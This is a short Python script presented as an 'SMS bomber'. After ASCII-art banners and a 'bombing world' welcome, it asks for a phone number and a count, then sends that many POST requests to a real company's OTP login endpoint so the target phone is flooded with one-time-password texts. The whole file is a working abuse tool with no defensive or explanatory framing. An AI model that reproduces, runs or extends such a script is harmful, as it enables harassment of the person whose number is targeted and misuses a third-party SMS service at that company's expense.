import os
import time
import sys
black="\033[1;90m"     
red="\033[1;91m"        
green="\033[1;92m"      
yellow="\033[1;93m"     
blue="\033[1;94m"       
purple="\033[1;95m"     
cyan="\033[1;96m"       
white="\033[1;97m"      

def sprint(s):
	for c in s+"\n":
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(10/3000)

os.system("clear")


sprint(green+"============================================================")
sprint(red+"============================================================")


sprint(green+"""
  _____ ____  __ __         __    __   ____  ____     ___ 
 / ___/|    \|  |  |       |  |__|  | /    ||    \   /  _]
(   \_ |  o  )  |  | _____ |  |  |  ||  o  ||  D  ) /  [_ 
 \__  ||   _/|  ~  ||     ||  |  |  ||     ||    / |    _]
 /  \ ||  |  |___, ||_____||  `  '  ||  _  ||    \ |   [_ 
 \    ||  |  |     |        \      / |  |  ||  .  \|     |
  \___||__|  |____/          \_/\_/  |__|__||__|\_||_____|
                                                          
""")

sprint(red+"============================================================")
sprint(green+"============================================================")
time.sleep(3)

sprint(yellow+"\n               [WELCOME TO MY BOMBING WORLD]")

sprint(green+"\n               [CODED BY FARHAN SADIK PRANTO]")
time.sleep(5)
os.system("clear")


sprint(green+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

sprint(green+"""
 _     _ _   _   _            ______             
| |   (_) | | | | |           | ___ \            
| |    _| |_| |_| | ___ ______| |_/ / ___  _   _ 
| |   | | __| __| |/ _ \______| ___ \/ _ \| | | |
| |___| | |_| |_| |  __/      | |_/ / (_) | |_| |
\_____/_|\__|\__|_|\___|      \____/ \___/ \__, |
                                            __/ |
                                           |___/
                                        """)


sprint(green+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

import requests


num=str(input(green+"\n ENTER YOUR NUMBER = "))
time.sleep(3)
amu=int(input(green+"\n ENTER YOUR AMOUNT = "))



api2="https://portal.flipper.com.bd/api/v1/send-otp/login"
data2={"mobile_number": num}
os.system("clear")

for i in range(amu):
	requests.post(api2,data=data2)
	print(str(i+1)+"[SMS-HAD-SEND]")
